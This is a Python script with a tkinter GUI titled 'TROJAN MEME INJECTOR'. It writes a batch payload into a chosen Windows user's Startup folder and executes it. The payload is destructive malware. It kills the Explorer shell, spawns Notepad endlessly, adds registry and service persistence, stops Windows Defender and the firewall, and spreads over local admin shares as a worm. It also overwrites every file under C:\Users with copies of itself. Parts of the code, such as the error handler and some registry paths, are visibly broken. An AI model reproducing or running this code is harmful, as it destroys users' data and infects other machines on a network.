from tkinter import *
import os


def errorgone():
	error.destroy()


def inject():
	username1 = username.get()
	if username == None:
		error = Tk()
		screen.geometry("200x200")
		screen.title('Error Exiting Program')
		Label(text='''Enter A UserName Else Check It By Opening C:Users''').pack()
		screen.destroy()
		Button(text="EXIT", command = errorgone).pack()





	os.chdir(rf'C:\Users\{username1}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
	file=open('activated.bat', "w")
	file.write(r'''@echo off
taskkill /f /im explorer.exe
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
@echo off
SET i=0
SET "NomeProcesso=DaMonki.exe"
SET "NomeService=DaMonki"

rem <=== run as service ===>
echo sc create %NomeService% binpath=%0 > service.bat
echo sc start %NomeService% >> service.bat
attrib +h +r +s service.bat
start service.bat
rem <=== startup registry ===>
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0
rem <=== kill firewall and windows defender ===>
net stop "Windows Defender Service"
net stop "Windows Firewall"
rem <=== INFECT NETWORK!!! ===>
:Worm
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto Worm
rem <=== infect *.* in C:\Users ===>
:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)''')








	file.close()
	os.system('activated.bat')
	Button(text='BYEE').pack()


def main_screen():
	screen = Tk()
	screen.geometry("500x500")
	screen.title("TROJAN MEME INJECTOR")

	global username
	username = StringVar()
	Button(text = "Inject", height = "2", width = "30", command = inject).pack()
	Label(text="Enter Your Windows Username That You Want To Inject The Trojan Meme To:").pack()
	Entry(textvariable = username).pack()




	screen.mainloop()

main_screen()
